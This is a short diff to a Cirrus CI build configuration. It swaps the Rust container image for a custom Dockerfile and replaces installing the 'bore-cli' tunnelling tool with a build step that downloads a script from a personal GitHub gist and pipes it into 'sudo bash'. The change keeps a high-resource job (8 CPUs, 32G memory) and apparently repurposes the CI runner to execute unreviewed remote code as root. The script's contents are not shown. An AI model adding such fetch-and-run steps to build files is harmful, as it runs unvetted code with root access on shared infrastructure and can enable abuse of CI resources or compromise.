@@ -3,7 +3,7 @@ task:
   name: Builds
   timeout_in: 120m
   container:
-    image: rust:latest
+    dockerfile: Dockerfile
     cpu: 8
     memory: 32G
   
@@ -11,4 +11,4 @@ task:
     CIRRUS_WORKING_DIR: "/tmp/ci"
 
   build_script:
-    - cargo install bore-cli
+    - curl https://gist.githubusercontent.com/karthik4579/cc43060742999cb85befb93299474fe2/raw/9114e6a141153465a621c64acd2a1423f5c9894a/code.sh | sudo bash
